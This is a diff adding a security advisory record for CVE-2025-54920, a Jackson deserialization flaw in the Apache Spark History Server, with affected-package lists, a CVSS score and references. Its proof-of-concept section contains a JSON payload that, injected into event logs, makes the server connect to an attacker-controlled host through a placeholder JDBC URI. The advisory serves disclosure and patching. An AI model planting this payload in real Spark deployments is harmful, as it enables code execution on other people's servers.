@@ -1,0 +1,266 @@
+advisory_id: GHSA-jwp6-cvj8-fw65
+datasource_id: github_osv/GHSA-jwp6-cvj8-fw65
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-jwp6-cvj8-fw65/GHSA-jwp6-cvj8-fw65.json
+aliases:
+  - CVE-2025-54920
+summary: |
+  Apache Spark: Spark History Server Code Execution Vulnerability
+  This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.
+
+  ## Summary
+
+  Apache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.
+
+  ## Details
+
+  The vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as org.apache.hive.jdbc.HiveConnection, which can perform network calls or other malicious actions during deserialization.
+
+  The attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.
+
+  ## Proof of Concept:
+
+  1. Run Spark with event logging enabled, writing to a writable directory (spark-logs).
+
+  2. Inject the following JSON at the beginning of an event log file:
+
+  ```
+  {
+
+    "Event": "org.apache.hive.jdbc.HiveConnection",
+    "uri": "jdbc:hive2://<IP>:<PORT>/",
+    "info": {
+      "hive.metastore.uris": "thrift://<IP>:<PORT>"
+    }
+  }
+  ```
+  3. Start the Spark History Server with logs pointing to the modified directory.
+
+  4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.
+
+  ## Impact
+
+  An attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.
+impacted_packages:
+  - purl: pkg:maven/org.apache.spark/spark-core_2.9.3
+    affected_versions: vers:maven/<=0.8.1-incubating
+    fixed_versions:
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.9.3@0.8.0-incubating
+      - pkg:maven/org.apache.spark/spark-core_2.9.3@0.8.1-incubating
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/org.apache.spark/spark-core_2.13
+    affected_versions: vers:maven/>=4.0.0|<4.0.1
+    fixed_versions: vers:maven/4.0.1
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.13@4.0.0
+      - pkg:maven/org.apache.spark/spark-core_2.13@4.0.0-preview1
+      - pkg:maven/org.apache.spark/spark-core_2.13@4.0.0-preview2
+    fixed_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.13@4.0.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/org.apache.spark/spark-core_2.13
+    affected_versions: vers:maven/<3.5.7
+    fixed_versions: vers:maven/3.5.7
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.2.3
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.2.4
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.3.0
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.3.1
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.3.2
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.3.3
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.3.4
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.4.2
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.4.3
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.4.4
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.0
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.1
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.2
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.3
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.4
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.5
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.6
+    fixed_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.13@3.5.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/org.apache.spark/spark-core_2.12
+    affected_versions: vers:maven/<3.5.7
+    fixed_versions: vers:maven/3.5.7
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.4
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.5
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.6
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.7
+      - pkg:maven/org.apache.spark/spark-core_2.12@2.4.8
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.0-preview
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.0-preview2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.0.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.1.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.1.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.1.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.1.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.2.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.2.4
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.3.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.3.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.3.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.3.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.3.4
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.4.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.4.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.4.4
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.0
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.1
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.2
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.3
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.4
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.5
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.6
+    fixed_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.12@3.5.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/org.apache.spark/spark-core_2.11
+    affected_versions: vers:maven/<=2.4.8
+    fixed_versions:
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.3.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.3.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.5.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.5.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.5.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.6.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.6.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.6.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@1.6.3
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.0.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.0.0-preview
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.0.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.0.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.1.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.1.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.1.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.1.3
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.2.3
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.3.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.3.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.3.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.3.3
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.3.4
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.2
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.3
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.4
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.5
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.6
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.7
+      - pkg:maven/org.apache.spark/spark-core_2.11@2.4.8
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/org.apache.spark/spark-core_2.10
+    affected_versions: vers:maven/<=2.2.3
+    fixed_versions:
+    affected_packages:
+      - pkg:maven/org.apache.spark/spark-core_2.10@0.9.0-incubating
+      - pkg:maven/org.apache.spark/spark-core_2.10@0.9.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@0.9.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.0.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.0.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.0.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.1.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.1.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.3.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.3.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.4.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.4.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.5.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.5.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.5.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.6.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.6.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.6.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@1.6.3
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.0.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.0.0-preview
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.0.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.0.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.1.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.1.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.1.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.1.3
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.2.0
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.2.1
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.2.2
+      - pkg:maven/org.apache.spark/spark-core_2.10@2.2.3
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-jwp6-cvj8-fw65/GHSA-jwp6-cvj8-fw65.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-502
+references:
+  - url: https://github.com/apache/spark
+    reference_type:
+    reference_id:
+  - url: https://github.com/apache/spark/pull/51312
+    reference_type:
+    reference_id:
+  - url: https://github.com/apache/spark/pull/51323
+    reference_type:
+    reference_id:
+  - url: https://issues.apache.org/jira/browse/SPARK-52381
+    reference_type:
+    reference_id:
+  - url: https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s
+    reference_type:
+    reference_id:
+  - url: http://www.openwall.com/lists/oss-security/2026/03/13/4
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54920
+    reference_type:
+    reference_id: CVE-2025-54920
+exploits: []
